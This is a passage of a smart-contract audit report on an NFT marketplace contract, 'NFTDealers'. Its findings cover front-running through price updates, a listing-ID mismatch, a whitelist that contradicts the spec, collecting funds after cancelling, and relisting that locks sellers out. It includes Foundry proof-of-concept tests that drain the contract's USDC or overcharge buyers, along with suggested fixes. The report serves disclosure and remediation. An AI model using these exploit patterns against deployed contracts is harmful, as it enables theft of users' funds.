    uint256 attackerBalanceBeforeCollecting = usdc.balanceOf(attacker);
    uint256 contractBalanceBeforeCollecting = usdc.balanceOf(address(nftDealers));

    // The attacker's listing status is inactive, he can now collect fees because it's the only requirement to collect fees
    vm.startPrank(attacker);
    nftDealers.collectUsdcFromSelling(attackTokenId);

    // Attacker earned the whole contract balance
    vm.assertEq(usdc.balanceOf(address(nftDealers)), 0);
    vm.assertEq(usdc.balanceOf(attacker), attackerBalanceBeforeCollecting + contractBalanceBeforeCollecting);
}
```

## Recommended Mitigation

Add a property to the **Listing** object that will allow the function `collectUsdcFromSelling` to check that the NFT's payment claim is pending:

```diff
struct Listing {
    address seller;
    uint32 price;
    address nft;
    uint256 tokenId;
    bool isActive;
+   bool claimPending
}

function buy(uint256 _listingId) external payable {
    ...
    
    s_listings[_listingId].isActive = false;
+   s_listings[_listingId].claimPending = true;

    emit NFT_Dealers_Sold(msg.sender, listing.price);
}

function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    ...

    totalFeesCollected += fees;
    amountToSeller += collateralToReturn;
+   s_listings[_listingId].claimPending = false;

    usdc.safeTransfer(address(this), fees);
    usdc.safeTransfer(msg.sender, amountToSeller);
}
```

## <a id='H-06'></a>H-06. Seller Can Front-Run Buyers via updatePrice to Extract More USDC

_Submitted by [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [cymans](https://profiles.cyfrin.io/u/cymans), [fredo182](https://profiles.cyfrin.io/u/fredo182), [0xberzerk](https://profiles.cyfrin.io/u/0xberzerk). Selected submission by: [fredo182](https://profiles.cyfrin.io/u/fredo182)._      
            


# Seller Can Front-Run Buyers via updatePrice to Extract More USDC

## Description

`buy()` reads `listing.price` directly from storage at execution time and transfers that exect amount from the buyer. There is no mechanism for the buyer to specify a maximum acceptable price. Because `updatePrice()` is unrestricted in timing, a seller can observe a pending `buy()` transaction in the mempool and front-run it with a higher price resulting in buyer paying the inflated price without concent.

```solidity
// updatePrice() — no timing lock, callable at any moment during an active listing
function updatePrice(uint256 _listingId, uint32 _newPrice) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
    uint256 oldPrice = listing.price;
    if (!listing.isActive) revert ListingNotActive(_listingId);
    require(_newPrice > 0, "Price must be greater than 0");

    // @> price silently updated in storage before buy() executes
    s_listings[_listingId].price = _newPrice;
    emit NFT_Dealers_Price_Updated(_listingId, oldPrice, _newPrice);
}

// buy() — reads price at execution time, no maxPrice parameter
function buy(uint256 _listingId) external payable {
    Listing memory listing = s_listings[_listingId];
    if (!listing.isActive) revert ListingNotActive(_listingId);
    require(listing.seller != msg.sender, "Seller cannot buy their own NFT");

    // @> transfers whatever price is in storage — buyer has no slippage protection
    bool success = usdc.transferFrom(msg.sender, address(this), listing.price);
    require(success, "USDC transfer failed");
    _safeTransfer(listing.seller, msg.sender, listing.tokenId, "");
    s_listings[_listingId].isActive = false;
}
```

## Risk

**Likelihood**: High

- Buyers routinely approve large of unlimited USDC allows to avoid repeated approvals, making this trivially exploitable without any additional setup on the attacker's side.

- Any seller with an active listing can front-run every incoming `buy()` - no special privileges, no contract state required beyond being the listing owner.

**Impact**: High

- The buyer pays more USDC than the price they agreed to, with no recourse - the trade is final and irreversible.

- The excess USDC is locked in the contract as part of the seller's proceeds, effectively stolen from the buyer.

## Proof of Concept

```solidity
function test_FrontRunningBuyers() public {
    // Initialize test
    vm.startBroadcast(owner);
    nftDealers.whitelistWallet(seller);
    nftDealers.revealCollection();
    vm.stopBroadcast();

    // Assert state after initialization
    assertEq(nftDealers.whitelistedUsers(seller), true);
    assertEq(nftDealers.isCollectionRevealed(), true);

    // Mint
    vm.startBroadcast(seller);
    usdc.approve(address(nftDealers), USDC_COLLATERAL);
    nftDealers.mintNft();
    vm.stopBroadcast();

    // Assert state after mint
    uint256 tokenId = 1;
    assertEq(nftDealers.ownerOf(tokenId), seller);
    assertEq(nftDealers.collateralForMinting(tokenId), USDC_COLLATERAL);
    assertEq(usdc.balanceOf(address(nftDealers)), INITIAL_USER_BALANCE + USDC_COLLATERAL);
    assertEq(usdc.balanceOf(seller), INITIAL_USER_BALANCE - USDC_COLLATERAL);

    // List NFT
    uint32 sellingPrice = 40e6;
    vm.prank(seller);
    nftDealers.list(tokenId, sellingPrice);

    // Assert state after list
    (address _seller, uint32 _price, address _nft, uint256 _tokenId, bool _isActive) =
        nftDealers.s_listings(tokenId);
    assertEq(_seller, seller);
    assertEq(_price, sellingPrice);
    assertEq(_nft, address(nftDealers));
    assertEq(_tokenId, tokenId);
    assertEq(_isActive, true);
    assertEq(nftDealers.ownerOf(tokenId), seller);

    // Buyer approving amount for buying several NFTs
    vm.prank(buyer);
    usdc.approve(address(nftDealers), type(uint32).max);

    // Update the listing price - Front run simulation
    uint32 doublePrice = sellingPrice * 2;
    vm.prank(seller);
    nftDealers.updatePrice(tokenId, doublePrice);

    // Buy the NFT listing
    vm.prank(buyer);
    nftDealers.buy(tokenId);

    // Assert state after trade succeeds
    assertEq(nftDealers.ownerOf(tokenId), buyer);
    // How much they thought they are buying
    assertLt(usdc.balanceOf(buyer), INITIAL_USER_BALANCE - sellingPrice);
    // How much they actually bought it
    assertEq(usdc.balanceOf(buyer), INITIAL_USER_BALANCE - doublePrice);
}
```

## Recommended Mitigation

Add a `maxPrice` parameter to `buy()` and revert if the stored price exceeds it, giving buyers slippage protection equivalent to AMM deadline/slippage guards.

```diff
- function buy(uint256 _listingId) external payable {
+ function buy(uint256 _listingId, uint32 _maxPrice) external payable {
      Listing memory listing = s_listings[_listingId];
      if (!listing.isActive) revert ListingNotActive(_listingId);
      require(listing.seller != msg.sender, "Seller cannot buy their own NFT");
+     require(listing.price <= _maxPrice, "Price exceeds maximum acceptable price");

      bool success = usdc.transferFrom(msg.sender, address(this), listing.price);
      require(success, "USDC transfer failed");
      _safeTransfer(listing.seller, msg.sender, listing.tokenId, "");
      s_listings[_listingId].isActive = false;
  }
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. Listing ID mismatch: storage keyed by tokenId while events emit listingsCounter breaks all marketplace operations

_Submitted by [l0cu70s](https://profiles.cyfrin.io/u/l0cu70s), [raihanmd](https://profiles.cyfrin.io/u/raihanmd), [vneseseller](https://profiles.cyfrin.io/u/vneseseller), [primemate](https://profiles.cyfrin.io/u/primemate), [diegotrigueros](https://profiles.cyfrin.io/u/diegotrigueros), [webrainsec](https://profiles.cyfrin.io/u/webrainsec), [eliab256](https://profiles.cyfrin.io/u/eliab256), [ahmad044](https://profiles.cyfrin.io/u/ahmad044), [sammy0x100](https://profiles.cyfrin.io/u/sammy0x100), [perun84](https://profiles.cyfrin.io/u/perun84), [vanoxt](https://profiles.cyfrin.io/u/vanoxt), [oxeugenio](https://profiles.cyfrin.io/u/oxeugenio), [0xki](https://profiles.cyfrin.io/u/0xki), [cymans](https://profiles.cyfrin.io/u/cymans), [howiecht](https://profiles.cyfrin.io/u/howiecht), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [asssol](https://profiles.cyfrin.io/u/asssol), [0xaljzoli](https://profiles.cyfrin.io/u/0xaljzoli), [0xberzerk](https://profiles.cyfrin.io/u/0xberzerk), [altshar](https://profiles.cyfrin.io/u/altshar), [lemrabetmoctar1](https://profiles.cyfrin.io/u/lemrabetmoctar1), [jfornells](https://profiles.cyfrin.io/u/jfornells), [santhiya11112](https://profiles.cyfrin.io/u/santhiya11112), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [jhongamersx](https://profiles.cyfrin.io/u/jhongamersx), [adcdiii](https://profiles.cyfrin.io/u/adcdiii). Selected submission by: [vneseseller](https://profiles.cyfrin.io/u/vneseseller)._      
            


# Root + Impact

## Description

`list()` stores the listing in `s_listings[_tokenId]` but emits `NFT_Dealers_Listed(..., listingsCounter)`. All downstream functions (`buy`, `cancelListing`, `updatePrice`, `collectUsdcFromSelling`) accept a `_listingId` parameter and look up `s_listings[_listingId]`. When a user follows the event-emitted `listingId` (as any frontend or indexer would), the lookup hits an empty or wrong storage slot — causing reverts or purchasing the wrong NFT.

## Risk

Likelihood:

* Occurs whenever a user lists a token whose `tokenId` differs from the current `listingsCounter` value — this is the normal case when users mint multiple tokens before listing, or list tokens in non-sequential order

* Any frontend, indexer, or direct contract interaction that reads emitted events will use the wrong ID

Impact:

* Core marketplace functions (`buy`, `cancelListing`, `updatePrice`, `collectUsdcFromSelling`) break for any listing where `tokenId ≠ listingsCounter`

* Collision scenario: if tokenId A and listingsCounter B happen to match a different listing's storage key, a buyer pays for item A but receives item B — wrong NFT purchased

* Marketplace is unusable for normal multi-user operation

## Proof of Concept

```bash
forge test --match-test test_H04_ListingIdTokenIdMismatch -vvv
```

Scenario: Alice mints tokens 1, 2. Carol mints token 3. Carol lists token 3 — this is listing #1 (`listingsCounter = 1`), but storage is at `s_listings[3]`.

| What event says | Where it's stored | What buy() looks up                   |
| --------------- | ----------------- | ------------------------------------- |
| `listingId = 1` | `s_listings[3]`   | `s_listings[1]` = empty → **reverts** |

```solidity
function test_H04_ListingIdTokenIdMismatch() public {
    // Alice mints tokens 1 and 2
    vm.startPrank(alice);
    usdc.approve(address(nftDealers), type(uint256).max);
    nftDealers.mintNft(); // tokenId 1
    nftDealers.mintNft(); // tokenId 2
    vm.stopPrank();

    // Carol mints token 3
    vm.startPrank(carol);
    usdc.approve(address(nftDealers), type(uint256).max);
    nftDealers.mintNft(); // tokenId 3
    vm.stopPrank();

    // Carol lists token 3 — this is listing #1 (listingsCounter=1)
    // Event emits listingId=1, but storage is at s_listings[3] (tokenId)
    vm.prank(carol);
    nftDealers.list(3, uint32(100e6));

    assertEq(nftDealers.totalListings(), 1);

    // Bob tries to buy "listing 1" (from the event) — but s_listings[1] is empty!
    vm.startPrank(bob);
    usdc.approve(address(nftDealers), type(uint256).max);
    vm.expectRevert(abi.encodeWithSelector(NFTDealers.ListingNotActive.selector, 1));
    nftDealers.buy(1); // FAILS — listing 1 doesn't exist
    vm.stopPrank();

    // Bob needs to know to use tokenId=3, not listingId=1
    vm.startPrank(bob);
    nftDealers.buy(3); // This works
    vm.stopPrank();
    assertEq(nftDealers.ownerOf(3), bob);
}
```

Output: `buy(1)` reverts with `ListingNotActive(1)`. `buy(3)` succeeds — proves storage key is `tokenId`, not `listingsCounter`.

## Recommended Mitigation

Root cause — `list()` stores by `_tokenId` but emits `listingsCounter`:

```solidity
function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
    // ...
    listingsCounter++;
    activeListingsCounter++;

@>  s_listings[_tokenId] = Listing({       // stored at _tokenId
        seller: msg.sender,
        price: _price,
        nft: address(this),
        tokenId: _tokenId,
        isActive: true
    });
@>  emit NFT_Dealers_Listed(msg.sender, listingsCounter); // event emits counter
}
```

Fix — use one canonical key for storage, events, and function parameters:

```diff
 function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
     // ...
     listingsCounter++;
     activeListingsCounter++;
 
-    s_listings[_tokenId] = Listing({
+    s_listings[listingsCounter] = Listing({
         seller: msg.sender,
         price: _price,
         nft: address(this),
         tokenId: _tokenId,
         isActive: true
     });
     emit NFT_Dealers_Listed(msg.sender, listingsCounter);
 }
```

## <a id='M-02'></a>M-02. `list()` enforces `onlyWhitelisted` despite the specification stating non-whitelisted users can list NFTs, creating an asymmetric marketplace

_Submitted by [primemate](https://profiles.cyfrin.io/u/primemate), [webrainsec](https://profiles.cyfrin.io/u/webrainsec), [huicanvie](https://profiles.cyfrin.io/u/huicanvie), [ahmad044](https://profiles.cyfrin.io/u/ahmad044), [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate), [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [fredo182](https://profiles.cyfrin.io/u/fredo182), [howiecht](https://profiles.cyfrin.io/u/howiecht), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [satya](https://profiles.cyfrin.io/u/satya), [jimmychu0807](https://profiles.cyfrin.io/u/jimmychu0807), [belladonna](https://profiles.cyfrin.io/u/belladonna), [kpfgt14](https://profiles.cyfrin.io/u/kpfgt14), [lemrabetmoctar1](https://profiles.cyfrin.io/u/lemrabetmoctar1), [jfornells](https://profiles.cyfrin.io/u/jfornells), [jamie54781](https://profiles.cyfrin.io/u/jamie54781), [ebukar](https://profiles.cyfrin.io/u/ebukar), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [farnad](https://profiles.cyfrin.io/u/farnad). Selected submission by: [belladonna](https://profiles.cyfrin.io/u/belladonna)._      
            


## Root + Impact

### Description

The `list()` function (L127-139) enforces the `onlyWhitelisted` modifier (L77-80), but the protocol specification explicitly states that non-whitelisted users can "buy, update price, cancel listing, **list NFT**, collect USDC after selling". This is the **only** marketplace function that contradicts the specification -- all four other functions that the spec says non-whitelisted users can access are correctly unrestricted:

| Function                   | Line     | Modifier              | Whitelist Required? | Spec Says?  | Match? |
| -------------------------- | -------- | --------------------- | ------------------- | ----------- | ------ |
| `buy()`                    | L141     | none                  | No                  | Can use     | ✅      |
| `updatePrice()`            | L185     | `onlySeller`          | No                  | Can use     | ✅      |
| `cancelListing()`          | L157     | none                  | No                  | Can use     | ✅      |
| **`list()`**               | **L127** | **`onlyWhitelisted`** | **Yes**             | **Can use** | **❌**  |
| `collectUsdcFromSelling()` | L171     | `onlySeller`          | No                  | Can use     | ✅      |

The root cause is the `onlyWhitelisted` modifier on `list()` at L127:

```solidity
function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted { // @audit L127: onlyWhitelisted contradicts spec
    require(_price >= MIN_PRICE, "Price must be at least 1 USDC");        // @audit L128
    require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");         // @audit L129: ownership check is sufficient access control
    require(s_listings[_tokenId].isActive == false, "NFT is already listed"); // @audit L130
    require(_price > 0, "Price must be greater than 0");                   // @audit L131
    ...
}
```

This creates an asymmetric marketplace where **anyone can buy**, but **only whitelisted users can sell**. Two realistic scenarios produce trapped NFT owners:

1. **Non-whitelisted buyer**: `buy()` (L141) has no whitelist restriction, so any user can purchase an NFT. But the buyer cannot re-list it because `list()` requires whitelist status. The protocol's own marketplace creates users who can buy but not sell.

2. **De-whitelisted user**: The owner can call `removeWhitelistedWallet()` (L106-108) at any time per the specification. A user who minted NFTs while whitelisted and is later removed from the whitelist permanently loses the ability to list their NFTs on the marketplace.

## Risk

**Likelihood:**

* Occurs for **every** non-whitelisted user who acquires an NFT -- whether via `buy()` (L141, no whitelist restriction), standard ERC721 `transferFrom`, or after being removed from the whitelist via `removeWhitelistedWallet()` (L106-108)

* The owner can remove wallets from the whitelist at any time per the specification, affecting previously whitelisted users

* `buy()` is completely unrestricted, so non-whitelisted buyers routinely enter the marketplace and acquire NFTs they cannot resell

**Impact:**

* Non-whitelisted NFT owners cannot sell on the protocol's marketplace, contradicting the documented behavior

* Creates a buy-only trap: users purchase NFTs via `buy()` expecting to participate fully in the marketplace, but cannot resell

* De-whitelisted users lose marketplace access for NFTs they legitimately minted and own

* NFTs are not completely locked (ERC721 `transferFrom` still works), but the protocol's core selling functionality is inaccessible

## Proof of Concept

Two scenarios demonstrate the issue. Run with `forge test --match-contract M02PoCTest -vv`:

**Scenario 1**: Non-whitelisted buyer purchases an NFT via `buy()` then cannot re-list it.
**Scenario 2**: User mints while whitelisted, then owner removes them from whitelist -- they can no longer list.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.34;

import {Test, console} from "forge-std/Test.sol";
import {NFTDealers} from "../src/NFTDealers.sol";
import {MockUSDC} from "../src/MockUSDC.sol";

contract M02PoCTest is Test {
    NFTDealers public nftDealers;
    MockUSDC public usdc;

    address public owner = makeAddr("owner");
    address public seller = makeAddr("seller");
    address public buyer = makeAddr("buyer"); // deliberately NOT whitelisted

    uint256 constant LOCK_AMOUNT = 20e6; // 20 USDC

    function setUp() public {
        usdc = new MockUSDC();
        nftDealers = new NFTDealers(owner, address(usdc), "NFTDealers", "NFTD", "ipfs://test/", LOCK_AMOUNT);

        vm.startPrank(owner);
        nftDealers.revealCollection();
        nftDealers.whitelistWallet(seller);
        // buyer is NOT whitelisted -- per README, they should still be able to list
        vm.stopPrank();

        usdc.mint(seller, 1000e6);
        usdc.mint(buyer, 1000e6);

        vm.prank(seller);
        usdc.approve(address(nftDealers), type(uint256).max);
        vm.prank(buyer);
        usdc.approve(address(nftDealers), type(uint256).max);
    }

    function test_nonWhitelistedBuyerCannotRelist() public {
        // --- Seller mints and lists ---
        vm.prank(seller);
        nftDealers.mintNft(); // tokenId 1
        vm.prank(seller);
        nftDealers.list(1, uint32(100e6)); // list for 100 USDC

        // --- Non-whitelisted buyer purchases via buy() -- no whitelist required ---
        assertFalse(nftDealers.isWhitelisted(buyer));
        vm.prank(buyer);
        nftDealers.buy(1); // succeeds: buy() has no onlyWhitelisted modifier

        // Buyer now owns the NFT
        assertEq(nftDealers.ownerOf(1), buyer);

        // --- Buyer tries to re-list on the marketplace -- REVERTS ---
        vm.prank(buyer);
        vm.expectRevert("Only whitelisted users can call this function");
        nftDealers.list(1, uint32(150e6));

        console.log("Non-whitelisted buyer owns NFT but cannot list it on the marketplace");
    }

    function test_dewhitelistedUserCannotList() public {
        // --- User mints while whitelisted ---
        vm.prank(seller);
        nftDealers.mintNft(); // tokenId 1

        // --- Owner removes seller from whitelist ---
        vm.prank(owner);
        nftDealers.removeWhitelistedWallet(seller);
        assertFalse(nftDealers.isWhitelisted(seller));

        // --- Formerly-whitelisted user tries to list -- REVERTS ---
        vm.prank(seller);
        vm.expectRevert("Only whitelisted users can call this function");
        nftDealers.list(1, uint32(100e6));

        console.log("De-whitelisted user owns NFT but cannot list it on the marketplace");
    }
}
```

## Recommended Mitigation

Remove the `onlyWhitelisted` modifier from `list()` to align with the specification. The `ownerOf(_tokenId) == msg.sender` check at L129 already provides sufficient access control -- only the actual NFT owner can list their token.

```diff
-function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
+function list(uint256 _tokenId, uint32 _price) external {
     require(_price >= MIN_PRICE, "Price must be at least 1 USDC");
     require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
     require(s_listings[_tokenId].isActive == false, "NFT is already listed");
     require(_price > 0, "Price must be greater than 0");

     listingsCounter++;
     activeListingsCounter++;

     s_listings[_tokenId] =
         Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});
     emit NFT_Dealers_Listed(msg.sender, listingsCounter);
 }
```

This fix:

1. Aligns `list()` with the specification and with all other marketplace functions (`buy`, `cancelListing`, `updatePrice`, `collectUsdcFromSelling`) which are already unrestricted
2. Preserves the ownership check at L129 (`ownerOf(_tokenId) == msg.sender`) as the access control mechanism
3. Allows non-whitelisted buyers who acquired NFTs via `buy()` to participate fully in the marketplace
4. Allows users removed from the whitelist to still manage and sell their existing NFTs

## <a id='M-03'></a>M-03. ### [C-2] `collectUsdcFromSelling()` does not distinguish between sold and cancelled listings, allowing any seller to drain contract funds

_Submitted by [symmate](https://profiles.cyfrin.io/u/symmate), [perun84](https://profiles.cyfrin.io/u/perun84), [velo](https://profiles.cyfrin.io/u/velo), [oxeugenio](https://profiles.cyfrin.io/u/oxeugenio), [0xprestonong](https://profiles.cyfrin.io/u/0xprestonong), [0xki](https://profiles.cyfrin.io/u/0xki), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [belladonna](https://profiles.cyfrin.io/u/belladonna), [ramilmustafin33](https://profiles.cyfrin.io/u/ramilmustafin33), [iamgeorgi](https://profiles.cyfrin.io/u/iamgeorgi), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d). Selected submission by: [symmate](https://profiles.cyfrin.io/u/symmate)._      
            


**Description:** `collectUsdcFromSelling()` only checks `!listing.isActive`, but `isActive = false` is set both when an NFT is sold (`buy()`) and when a listing is cancelled (`cancelListing()`). There is no field tracking whether a sale actually occurred. A seller can cancel their listing and then call `collectUsdcFromSelling()` to collect `listing.price - fees` USDC that was never deposited by any buyer.

```javascript
function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
@>  require(!listing.isActive, "Listing must be inactive to collect USDC");
    // No check: was the NFT actually sold, or just cancelled?

    uint256 fees = _calculateFees(listing.price);
    uint256 amountToSeller = listing.price - fees;
    // ...
    usdc.safeTransfer(msg.sender, amountToSeller); // drains other users' funds
}
```

**Impact:** Any seller can drain the contract's USDC by listing at a high price, cancelling, and then calling `collectUsdcFromSelling()`. Other users' collateral and sale proceeds are at risk.

**Proof of Concept:**

Victims mint NFTs depositing collateral into the contract. The attacker mints one NFT, lists at an inflated price, cancels (recovering their own collateral via the C-1 bug), then calls `collectUsdcFromSelling()` to drain `listing.price - fees` from the contract — funds that were never paid by any buyer.

Run `forge test --match-test test_poc_C2 -vvv` to see the following output:

```Solidity
Logs:
  After victims mint 5 NFTs:
    Contract USDC: 100000000
  After attacker list + cancel:
    Attacker USDC: 20000000
    Contract USDC: 100000000
  After attacker collectUsdcFromSelling:
    Attacker USDC: 119000000
    Contract USDC: 1000000
    Fees collected: 1000000
```

The attacker started with 20 USDC, recovered it via cancel, then stole 99 USDC from victims' collateral — net profit of 99 USDC with no buyer ever involved. The contract went from 100 USDC to 1 USDC (only fees remain).

<details>
<summary>PoC Test Code</summary>

```javascript
function test_poc_C2_collectAfterCancelDrainsContractFunds() public {
    // Setup
    vm.startPrank(owner);
    nftDealers.revealCollection();
    nftDealers.whitelistWallet(userWithCash);
    nftDealers.whitelistWallet(userWithEvenMoreCash);
    vm.stopPrank();

    // Victims mint 5 NFTs, depositing 100 USDC collateral into the contract
    vm.startPrank(userWithEvenMoreCash);
    usdc.approve(address(nftDealers), 5 * 20e6);
    for (uint256 i = 0; i < 5; i++) {
        nftDealers.mintNft();
    }
    vm.stopPrank();

    console.log("After victims mint 5 NFTs:");
    console.log("  Contract USDC:", usdc.balanceOf(address(nftDealers)));

    // Attacker mints 1 NFT (tokenId=6), paying 20 USDC collateral
    vm.startPrank(userWithCash);
    usdc.approve(address(nftDealers), 20e6);
    nftDealers.mintNft();
    vm.stopPrank();

    // Attacker lists at 100 USDC then cancels
    // cancelListing returns attacker's 20 USDC collateral (C-1 bug)
    vm.prank(userWithCash);
    nftDealers.list(6, uint32(100e6));
    vm.prank(userWithCash);
    nftDealers.cancelListing(6);

    console.log("After attacker list + cancel:");
    console.log("  Attacker USDC:", usdc.balanceOf(userWithCash));
    console.log("  Contract USDC:", usdc.balanceOf(address(nftDealers)));

    // Attacker calls collectUsdcFromSelling — listing is inactive (cancelled, not sold)
    // No buyer ever paid, but attacker drains listing.price - fees from contract
    vm.prank(userWithCash);
    nftDealers.collectUsdcFromSelling(6);

    uint256 fees = nftDealers.calculateFees(100e6); // 1% = 1 USDC

    console.log("After attacker collectUsdcFromSelling:");
    console.log("  Attacker USDC:", usdc.balanceOf(userWithCash));
    console.log("  Contract USDC:", usdc.balanceOf(address(nftDealers)));
    console.log("  Fees collected:", nftDealers.totalFeesCollected());

    // Attacker recovered 20 USDC (cancel) + stole 99 USDC (collect) = 119 USDC
    // Started with 20 USDC, net profit = 99 USDC stolen from victims' collateral
    assertEq(usdc.balanceOf(userWithCash), 20e6 + (100e6 - fees));
}
```

</details>

**Recommended Mitigation:** Add an `isSold` boolean field to the `Listing` struct. Set it to `true` only in `buy()`. Require `listing.isSold == true` in `collectUsdcFromSelling()`.

```diff
 struct Listing {
     address seller;
     uint32 price;
     address nft;
     uint256 tokenId;
     bool isActive;
+    bool isSold;
 }

 function buy(uint256 _listingId) external payable {
     // ...
     s_listings[_listingId].isActive = false;
+    s_listings[_listingId].isSold = true;
     // ...
 }

 function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
     Listing memory listing = s_listings[_listingId];
-    require(!listing.isActive, "Listing must be inactive to collect USDC");
+    require(listing.isSold, "NFT must be sold to collect USDC");
     // ...
 }
```

## <a id='M-04'></a>M-04. M06. Re-listing an NFT after purchase permanently locks the original seller's proceeds and redirects their collateral to the new seller

_Submitted by [webrainsec](https://profiles.cyfrin.io/u/webrainsec), [ahmad044](https://profiles.cyfrin.io/u/ahmad044), [fuzz755](https://profiles.cyfrin.io/u/fuzz755), [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate), [mamaz](https://profiles.cyfrin.io/u/mamaz), [asssol](https://profiles.cyfrin.io/u/asssol), [belladonna](https://profiles.cyfrin.io/u/belladonna), [ramilmustafin33](https://profiles.cyfrin.io/u/ramilmustafin33), [jamie54781](https://profiles.cyfrin.io/u/jamie54781), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [adcdiii](https://profiles.cyfrin.io/u/adcdiii). Selected submission by: [adcdiii](https://profiles.cyfrin.io/u/adcdiii)._      
            


# Root + Impact

## Description

* After a sale through `buy()`, the original seller is expected to call `collectUsdcFromSelling()` to receive their sale proceeds and recover their locked collateral. There is no deadline or urgency for this call — a seller may legitimately delay collecting.

* `list()` allows a new owner to relist a token as soon as the previous listing is inactive. When they do, the entire `s_listings[tokenId]` entry is overwritten with the new seller's address and price. Because `s_listings` is keyed by `tokenId` (not by a unique listing ID), there is no separate slot for the original seller's pending claim.

* Once the mapping is overwritten, the `onlySeller` modifier permanently blocks the original seller from calling `collectUsdcFromSelling()` or `updatePrice()`. Because `collateralForMinting[tokenId]` was never zeroed after the original sale, it is now accessible to whichever party next calls `collectUsdcFromSelling()` or `cancelListing()` — i.e., the new seller.

```solidity
// s_listings is keyed by tokenId, not by a unique listing counter
mapping(uint256 => Listing) public s_listings;

function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
    // ...
    require(s_listings[_tokenId].isActive == false, "NFT is already listed");
    // @> overwrites the previous seller's address and price — no history preserved
    s_listings[_tokenId] =
        Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});
    emit NFT_Dealers_Listed(msg.sender, listingsCounter);
}

modifier onlySeller(uint256 _listingId) {
    // @> after re-listing, this check now points to the NEW seller — original seller is permanently locked out
    require(s_listings[_listingId].seller == msg.sender, "Only seller can call this function");
    _;
}

function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    // ...
    // @> collateralForMinting[tokenId] was never zeroed after the original sale
    uint256 collateralToReturn = collateralForMinting[listing.tokenId];
    // @> the new seller receives the original minter's locked collateral
    usdc.safeTransfer(msg.sender, amountToSeller);
}
```

## Risk

**Likelihood**: Medium

* The trigger requires two conditions to align: (1) the new owner must be whitelisted (`list()` enforces `onlyWhitelisted`), and (2) they must relist before the original seller calls `collectUsdcFromSelling()`. Whitelisting is owner-controlled, so the re-lister is always a vetted participant.

* In normal marketplace use, NFT flipping (buy then immediately relist) is a common pattern. Any whitelisted flipper will trigger this silently without realising the original seller has not yet collected — no malicious intent required.

**Impact**: High

* The original seller permanently loses their entire sale proceeds (`listing.price - fees`) and their locked collateral (`lockAmount`). There is no recovery path — no admin function can reassign the frozen funds.

* The new seller who eventually calls `collectUsdcFromSelling()` or `cancelListing()` receives the original minter's `lockAmount` as a windfall, draining funds they are not entitled to.

## Proof of Concept

Setup: seller mints tokenId=1 and has 20 USDC locked as collateral.

1. Seller lists tokenId=1 at 100 USDC. `s_listings[1].seller = seller`.
2. Buyer purchases tokenId=1. Buyer pays 100 USDC. `s_listings[1].isActive = false`. `collateralForMinting[1] = 20e6` (never zeroed by `buy()`).
3. Seller has not yet collected — this is normal; there is no deadline.
4. Buyer immediately relists tokenId=1 at 50 USDC. `list(1, 50e6)` executes without error and overwrites `s_listings[1].seller = buyer`.
5. Seller calls `collectUsdcFromSelling(1)`. The `onlySeller` modifier checks `s_listings[1].seller == seller` but the stored seller is now `buyer` — the call reverts.
6. Buyer sells to a third party and calls `collectUsdcFromSelling(1)`. Buyer receives `50 - fee + 20 (seller's collateral) = ~67 USDC` instead of the \~47 USDC they are entitled to, pocketing the original seller's 20 USDC collateral.

```solidity
function test_relist_locksOriginalSellerProceeds() public {
    uint32 nftPrice = 100e6;

    // Seller lists tokenId=1
    vm.prank(seller);
    nftDealers.list(1, nftPrice);

    // Buyer purchases — seller's proceeds are now pending collection
    vm.startPrank(buyer);
    usdc.approve(address(nftDealers), nftPrice);
    nftDealers.buy(1);
    vm.stopPrank();

    // collateralForMinting[1] is still 20 USDC — not zeroed after buy()
    assertEq(nftDealers.collateralForMinting(1), LOCK_AMOUNT);

    // Buyer immediately relists — overwrites s_listings[1].seller to buyer
    vm.prank(owner);
    nftDealers.whitelistWallet(buyer); // buyer needs whitelist to list
    vm.startPrank(buyer);
    nftDealers.list(1, 50e6);
    vm.stopPrank();

    // Original seller can no longer collect — permanently locked out
    vm.prank(seller);
    vm.expectRevert("Only seller can call this function");
    nftDealers.collectUsdcFromSelling(1);

    // Buyer sells to a third party, then collects the original seller's collateral as a windfall
    address thirdParty = makeAddr("thirdParty");
    usdc.mint(thirdParty, 50e6);
    vm.startPrank(thirdParty);
    usdc.approve(address(nftDealers), 50e6);
    nftDealers.buy(1);
    vm.stopPrank();

    uint256 buyerBefore = usdc.balanceOf(buyer);
    vm.prank(buyer);
    nftDealers.collectUsdcFromSelling(1);
    uint256 buyerReceived = usdc.balanceOf(buyer) - buyerBefore;

    // Buyer received sale proceeds (50 - fee) PLUS the original seller's 20 USDC collateral
    uint256 fees = nftDealers.calculateFees(50e6);
    assertEq(buyerReceived, 50e6 - fees + LOCK_AMOUNT, "buyer received original seller's collateral");

    // Seller's 100 USDC proceeds and 20 USDC collateral are permanently lost
    // The contract has no mechanism to return them
}
```

## Recommended Mitigation

